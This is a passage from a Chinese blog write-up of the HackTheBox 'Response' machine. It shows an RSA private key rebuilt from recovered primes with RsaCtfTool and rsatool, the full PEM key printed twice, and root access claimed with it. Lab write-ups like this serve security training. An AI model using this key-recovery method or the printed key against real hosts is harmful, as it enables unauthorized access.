<p>这就是私钥所需的全部内容。有许多方法可以将其重新构建为可以用于SSH的私钥。再次使用RsaCtfTool，这次传递–private来输出私钥，以及-n、-p、-q和-e及其值。它将从那里完成其余的工作:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response]</span><br><span class="line">└─<span class="comment"># python /root/RsaCtfTool-master/RsaCtfTool.py --private -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217 -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 -e 65537</span></span><br><span class="line"></span><br><span class="line">Results <span class="keyword">for</span> /tmp/tmpl_4h_wqn:</span><br><span class="line"></span><br><span class="line">Private key :</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIG5AIBAAKCAYEAnjos+7lSWtfxsuqXqQOvG09p5TNhOnjVUS6aCJTckXqUJOje</span><br><span class="line">05AUsp0EoaGXrAcidoN6U4ll2SK2j/NLqSm9Rb7y0+21iB+2K8wR77YwCK8rod+W</span><br><span class="line">eYv68GnUFAKaHT0s/sDGEGmJt2ZUSQc/FJZKEjjwvX1Fa6zKEVCI7n5t+MKQTbc8</span><br><span class="line">be33GxGV8743146L+bZCoDkfZ/mJApardmTrPszckDnqc1haXVthfPDdm+ZZvd9u</span><br><span class="line">cHiTMPTBgZRyeMtuaNbYe6/eKgHoBQiLmhOPy14x8l2DRcyGG6e8mCnBBZ8/Ca0a</span><br><span class="line">BXgHe7oakCYvmR4j0X0gCMWv70DmQDeZC8oUj+wr4KXcPBGllIMWToSe1LOFbmay</span><br><span class="line">X0e907slB8JABS1GU/BK6L02ziKUhZcNYH4TTlDu/MIHO/J3iyquaqPPDEYHUvQZ</span><br><span class="line">CJHOeJweHQmR0qq65w4cxhvDDRIRh4gltjVD43mdg/Lx5xp/lyEIctwSwz1ikeaO</span><br><span class="line">Bdbwi+gF/6Ln9UlRAgMBAAECggGAR6IC13uRAzucWunF+2iFkBGl2XQnYndt67Dz</span><br><span class="line">X0s1iE88XnFm39Ts6egYPqyPo/we6BSh/svHZkRG7mixKkaRP9Aw0y1c7+GbcbyT</span><br><span class="line">qjiLCoNzd3doAmMTGmBu+RgseWxGwJa5lJiTFoqnQeCb+FAJ/LH2m3LpSNQTLz+M</span><br><span class="line">npxyYRqEhgqcuw/uvTx67LyDP31zdXvEMhFqXIImOxvHSHRr5CSO/mSZ9dpcHsPO</span><br><span class="line">IOhTC89/dWx/7T9JM/K64FU6deFyxplJMXePDvX5OZyRj9fjX8cvr+SMxiWCcjYU</span><br><span class="line">Ar1H6hxq/mWbNcDiwIXc0OKc+oFPH6zITwHeCrUkrAegVOP1MBf5WgX1gltHaK4W</span><br><span class="line">X5xhTHlI/f2rKIL4fISDvIihmgqUQ64u8ZwnDXIPAB0tkYpFSuFchBNIRUd87Yf3</span><br><span class="line">9i0NcNySOxYo9iI3u3nEwiYSLC/tWv98N3ahpVN53WC6YLqbMCpG2IELyuw7Il5K</span><br><span class="line">k3t904GGEmkfNXhM27b0B2pfyMOBAoHBAMuBGArAEKvvTrGm+wQJjaLm15xs2nwP</span><br><span class="line">vRu9Xjr/7spDhWhL69AuKT6RrVn68zErskP8dbIewetkYoUSk/tIYa3vis+8gWCc</span><br><span class="line">Q94vrMKtuqPfbYVYNjOXfJTCfzd3AkAp3ZBszht7n2IQZ2/xp6Agpd5rfS2QZjNv</span><br><span class="line">/YLy8myVGzsnG6bsOVW0eQtfeSf7us093xW+uBlYm7Rf0RpYLkjJZG9e5xIAp88w</span><br><span class="line">HZntEd3KnWNpkbwp28vVgasUOq3CQBbDOQKBwQDHCxoZcJnAxv8kfzxe8aG7UGjb</span><br><span class="line">OiYiFpUyts3nHirdztnS72CaRc741YylftPbSXQ4EQiGtboNA6zGKz8KtLm7r0Xq</span><br><span class="line">1RmOVR00TXMgTsgW/ZC6szA0vz39KeVBt7bjFv4iNp8pRo4+w1ykVqQ/i/Gcov67</span><br><span class="line">DqoWipF1JnKd2ACtkoMrbpntnN1XaWfaTKIt+iQ3xZtjEd5D/v+NUFd/vUFTX5eD</span><br><span class="line">xfjieNWndd/2A7pxhVqpvXEGxntsbxZquTJyPtkCgcATnMFgZ9ozd8CxxlHytaj8</span><br><span class="line">xhqJbMQxqKKlBb8LGJc+zvsQbiCv04MOEKQQQ+skFf38J1yAag5uTSJhiMTSNsuT</span><br><span class="line">I77Q/m3JjcXMp/OSX4PZPzMi4rl2h2buP0BbbBC/dklwHcxPQb6+iK4vT67D8+GI</span><br><span class="line">afuKZJw04NohwKA0brpNHRvBHor4A4iW3AClJdF+7jONuO+tIaj/3SwdydnMEfyn</span><br><span class="line">7xF93qpNgWmY6AwMv/YjGo19ANu57T2t6yksjcf3aaECgcEArmKRqTw32Of/3bAD</span><br><span class="line">6oL02bGnTHrzseXrLZVvbE/H6rExsla7Yi5LGUOvh8dIQdVnF0AFIlDRAln34188</span><br><span class="line">SlrwZvk23nl5fHQhtBMvDF05fLsHNCuNzojG/KjaDOuyNd+NI9iLNZR1R5PN9MVb</span><br><span class="line">/bjUJBHB74z3g+w/aE4ZGSWH4op8lW6/Oai3W8AjluSRKor/dEWS0Ad1nkkpCFwd</span><br><span class="line">bPMY6rzTeEXYukJ3ndHuOBIoJRFaz2AESJVYyTXChBphkipxAoHBAJU2qoufXBcT</span><br><span class="line">dWOy4/AzXlli42JP6+lZ5t1YFN27lx5c5Br5hxRBoQzUvvvA7Idx1nXhkxqTqnG4</span><br><span class="line">RY5pRaDRrbsy2vBEeu4QkWnB7OmjdnkrJJ9HJAMRwaUOKczS/iM4Q9cus7FtAqWH</span><br><span class="line">cyHNIkh4KR2OvAjGn++FFHLXqzXL4qc26BwhBbaAxAiYBJ40hNSA+F2GiTwuUaIj</span><br><span class="line">xDamrrFL/cNhMxyiXyPCgSq7oRfOxvBlnRihR6PyulUZHJkuBm36Iw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>解密成功获得ssh私钥<br>或者使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2l1cy9yc2F0b29s">rsatool<i class="fa fa-external-link-alt"></i></span>工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># python /root/rsatool/rsatool.py -f PEM -o private.pem -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 -e 65537 -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217</span></span><br><span class="line">Using (p, q) to calculate RSA paramaters</span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">9e3a2cfbb9525ad7f1b2ea97a903af1b4f69e533613a78d5512e9a0894dc917a9424e8ded39014b2</span><br><span class="line">9d04a1a197ac072276837a538965d922b68ff34ba929bd45bef2d3edb5881fb62bcc11efb63008af</span><br><span class="line">2ba1df96798bfaf069d414029a1d3d2cfec0c6106989b7665449073f14964a1238f0bd7d456bacca</span><br><span class="line">115088ee7e6df8c2904db73c6dedf71b1195f3be37d78e8bf9b642a0391f67f9890296ab7664eb3e</span><br><span class="line">ccdc9039ea73585a5d5b617cf0dd9be659bddf6e70789330f4c181947278cb6e68d6d87bafde2a01</span><br><span class="line">e805088b9a138fcb5e31f25d8345cc861ba7bc9829c1059f3f09ad1a0578077bba1a90262f991e23</span><br><span class="line">d17d2008c5afef40e64037990bca148fec2be0a5dc3c11a59483164e849ed4b3856e66b25f47bdd3</span><br><span class="line">bb2507c240052d4653f04ae8bd36ce229485970d607e134e50eefcc2073bf2778b2aae6aa3cf0c46</span><br><span class="line">0752f4190891ce789c1e1d0991d2aabae70e1cc61bc30d1211878825b63543e3799d83f2f1e71a7f</span><br><span class="line">97210872dc12c33d6291e68e05d6f08be805ffa2e7f54951</span><br><span class="line"></span><br><span class="line">e = 65537 (0x10001)</span><br><span class="line"></span><br><span class="line">d =</span><br><span class="line">47a202d77b91033b9c5ae9c5fb68859011a5d9742762776debb0f35f4b35884f3c5e7166dfd4ece9</span><br><span class="line">e8183eac8fa3fc1ee814a1fecbc7664446ee68b12a46913fd030d32d5cefe19b71bc93aa388b0a83</span><br><span class="line">737777680263131a606ef9182c796c46c096b9949893168aa741e09bf85009fcb1f69b72e948d413</span><br><span class="line">2f3f8c9e9c72611a84860a9cbb0feebd3c7aecbc833f7d73757bc432116a5c82263b1bc748746be4</span><br><span class="line">248efe6499f5da5c1ec3ce20e8530bcf7f756c7fed3f4933f2bae0553a75e172c6994931778f0ef5</span><br><span class="line">f9399c918fd7e35fc72fafe48cc6258272361402bd47ea1c6afe659b35c0e2c085dcd0e29cfa814f</span><br><span class="line">1facc84f01de0ab524ac07a054e3f53017f95a05f5825b4768ae165f9c614c7948fdfdab2882f87c</span><br><span class="line">8483bc88a19a0a9443ae2ef19c270d720f001d2d918a454ae15c84134845477ced87f7f62d0d70dc</span><br><span class="line">923b1628f62237bb79c4c226122c2fed5aff7c3776a1a55379dd60ba60ba9b302a46d8810bcaec3b</span><br><span class="line">225e4a937b7dd3818612691f35784cdbb6f4076a5fc8c381</span><br><span class="line"></span><br><span class="line">p =</span><br><span class="line">cb81180ac010abef4eb1a6fb04098da2e6d79c6cda7c0fbd1bbd5e3affeeca4385684bebd02e293e</span><br><span class="line">91ad59faf3312bb243fc75b21ec1eb6462851293fb4861adef8acfbc81609c43de2facc2adbaa3df</span><br><span class="line">6d85583633977c94c27f3777024029dd906cce1b7b9f6210676ff1a7a020a5de6b7d2d9066336ffd</span><br><span class="line">82f2f26c951b3b271ba6ec3955b4790b5f7927fbbacd3ddf15beb819589bb45fd11a582e48c9646f</span><br><span class="line">5ee71200a7cf301d99ed11ddca9d636991bc29dbcbd581ab143aadc24016c339</span><br><span class="line"></span><br><span class="line">q =</span><br><span class="line">c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8</span><br><span class="line">d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd</span><br><span class="line">90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a91</span><br><span class="line">7526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd4153</span><br><span class="line">5f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9</span><br><span class="line"></span><br><span class="line">Saving PEM as private.pem</span><br><span class="line">                                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]</span><br><span class="line">└─<span class="comment"># cat private.pem                                             </span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIG5AIBAAKCAYEAnjos+7lSWtfxsuqXqQOvG09p5TNhOnjVUS6aCJTckXqUJOje</span><br><span class="line">05AUsp0EoaGXrAcidoN6U4ll2SK2j/NLqSm9Rb7y0+21iB+2K8wR77YwCK8rod+W</span><br><span class="line">eYv68GnUFAKaHT0s/sDGEGmJt2ZUSQc/FJZKEjjwvX1Fa6zKEVCI7n5t+MKQTbc8</span><br><span class="line">be33GxGV8743146L+bZCoDkfZ/mJApardmTrPszckDnqc1haXVthfPDdm+ZZvd9u</span><br><span class="line">cHiTMPTBgZRyeMtuaNbYe6/eKgHoBQiLmhOPy14x8l2DRcyGG6e8mCnBBZ8/Ca0a</span><br><span class="line">BXgHe7oakCYvmR4j0X0gCMWv70DmQDeZC8oUj+wr4KXcPBGllIMWToSe1LOFbmay</span><br><span class="line">X0e907slB8JABS1GU/BK6L02ziKUhZcNYH4TTlDu/MIHO/J3iyquaqPPDEYHUvQZ</span><br><span class="line">CJHOeJweHQmR0qq65w4cxhvDDRIRh4gltjVD43mdg/Lx5xp/lyEIctwSwz1ikeaO</span><br><span class="line">Bdbwi+gF/6Ln9UlRAgMBAAECggGAR6IC13uRAzucWunF+2iFkBGl2XQnYndt67Dz</span><br><span class="line">X0s1iE88XnFm39Ts6egYPqyPo/we6BSh/svHZkRG7mixKkaRP9Aw0y1c7+GbcbyT</span><br><span class="line">qjiLCoNzd3doAmMTGmBu+RgseWxGwJa5lJiTFoqnQeCb+FAJ/LH2m3LpSNQTLz+M</span><br><span class="line">npxyYRqEhgqcuw/uvTx67LyDP31zdXvEMhFqXIImOxvHSHRr5CSO/mSZ9dpcHsPO</span><br><span class="line">IOhTC89/dWx/7T9JM/K64FU6deFyxplJMXePDvX5OZyRj9fjX8cvr+SMxiWCcjYU</span><br><span class="line">Ar1H6hxq/mWbNcDiwIXc0OKc+oFPH6zITwHeCrUkrAegVOP1MBf5WgX1gltHaK4W</span><br><span class="line">X5xhTHlI/f2rKIL4fISDvIihmgqUQ64u8ZwnDXIPAB0tkYpFSuFchBNIRUd87Yf3</span><br><span class="line">9i0NcNySOxYo9iI3u3nEwiYSLC/tWv98N3ahpVN53WC6YLqbMCpG2IELyuw7Il5K</span><br><span class="line">k3t904GGEmkfNXhM27b0B2pfyMOBAoHBAMuBGArAEKvvTrGm+wQJjaLm15xs2nwP</span><br><span class="line">vRu9Xjr/7spDhWhL69AuKT6RrVn68zErskP8dbIewetkYoUSk/tIYa3vis+8gWCc</span><br><span class="line">Q94vrMKtuqPfbYVYNjOXfJTCfzd3AkAp3ZBszht7n2IQZ2/xp6Agpd5rfS2QZjNv</span><br><span class="line">/YLy8myVGzsnG6bsOVW0eQtfeSf7us093xW+uBlYm7Rf0RpYLkjJZG9e5xIAp88w</span><br><span class="line">HZntEd3KnWNpkbwp28vVgasUOq3CQBbDOQKBwQDHCxoZcJnAxv8kfzxe8aG7UGjb</span><br><span class="line">OiYiFpUyts3nHirdztnS72CaRc741YylftPbSXQ4EQiGtboNA6zGKz8KtLm7r0Xq</span><br><span class="line">1RmOVR00TXMgTsgW/ZC6szA0vz39KeVBt7bjFv4iNp8pRo4+w1ykVqQ/i/Gcov67</span><br><span class="line">DqoWipF1JnKd2ACtkoMrbpntnN1XaWfaTKIt+iQ3xZtjEd5D/v+NUFd/vUFTX5eD</span><br><span class="line">xfjieNWndd/2A7pxhVqpvXEGxntsbxZquTJyPtkCgcATnMFgZ9ozd8CxxlHytaj8</span><br><span class="line">xhqJbMQxqKKlBb8LGJc+zvsQbiCv04MOEKQQQ+skFf38J1yAag5uTSJhiMTSNsuT</span><br><span class="line">I77Q/m3JjcXMp/OSX4PZPzMi4rl2h2buP0BbbBC/dklwHcxPQb6+iK4vT67D8+GI</span><br><span class="line">afuKZJw04NohwKA0brpNHRvBHor4A4iW3AClJdF+7jONuO+tIaj/3SwdydnMEfyn</span><br><span class="line">7xF93qpNgWmY6AwMv/YjGo19ANu57T2t6yksjcf3aaECgcEArmKRqTw32Of/3bAD</span><br><span class="line">6oL02bGnTHrzseXrLZVvbE/H6rExsla7Yi5LGUOvh8dIQdVnF0AFIlDRAln34188</span><br><span class="line">SlrwZvk23nl5fHQhtBMvDF05fLsHNCuNzojG/KjaDOuyNd+NI9iLNZR1R5PN9MVb</span><br><span class="line">/bjUJBHB74z3g+w/aE4ZGSWH4op8lW6/Oai3W8AjluSRKor/dEWS0Ad1nkkpCFwd</span><br><span class="line">bPMY6rzTeEXYukJ3ndHuOBIoJRFaz2AESJVYyTXChBphkipxAoHBAJU2qoufXBcT</span><br><span class="line">dWOy4/AzXlli42JP6+lZ5t1YFN27lx5c5Br5hxRBoQzUvvvA7Idx1nXhkxqTqnG4</span><br><span class="line">RY5pRaDRrbsy2vBEeu4QkWnB7OmjdnkrJJ9HJAMRwaUOKczS/iM4Q9cus7FtAqWH</span><br><span class="line">cyHNIkh4KR2OvAjGn++FFHLXqzXL4qc26BwhBbaAxAiYBJ40hNSA+F2GiTwuUaIj</span><br><span class="line">xDamrrFL/cNhMxyiXyPCgSq7oRfOxvBlnRihR6PyulUZHJkuBm36Iw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>同样成功解密，使用恢复的私钥成功获得root权限</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response10.png"></li>
</ul>
<h1 id="Reference-Sources"><a href="#Reference-Sources" class="headerlink" title="Reference Sources"></a>Reference Sources</h1><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzAyLzA0L2h0Yi1yZXNwb25zZS5odG1sI21ldGVycHJldGVyLXRyYWZmaWMtZGVjcnlwdGlvbg==">0xdf’s blog meterpreter-traffic-decryption<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly80NG1ha2VyLmluZm8vcC9yZXNwb25zZS8=">44maker’s blog HTB Response<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5jb20vaG9tZS9tYWNoaW5lcy93cml0ZXVwLzQ2OA==">HTB official response writeup<i class="fa fa-external-link-alt"></i></span></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/" title="HackTheBox Response [Msf Meterpreter 流量解密] + [破碎ssh key 复原]">https://fdlucifer.github.io/2023/02/07/msf-meterpreter-traffic-decrypt/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/reversing/" rel="tag"><i class="fa fa-tag"></i> reversing</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/01/17/mybb1-8-32-LFI-RCE/" rel="prev" title="mybb 1.8.32 代码审计 + LFI RCE 复现">
                  <i class="fa fa-chevron-left"></i> mybb 1.8.32 代码审计 + LFI RCE 复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/04/08/wordpress-core-sql-CVE-2022%E2%80%9321661/" rel="next" title="WordPress核心框架WP_Query - 带插件SQL注入代码审计复现(CVE-2022–21661)">
                  WordPress核心框架WP_Query - 带插件SQL注入代码审计复现(CVE-2022–21661) <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">630k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:09</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
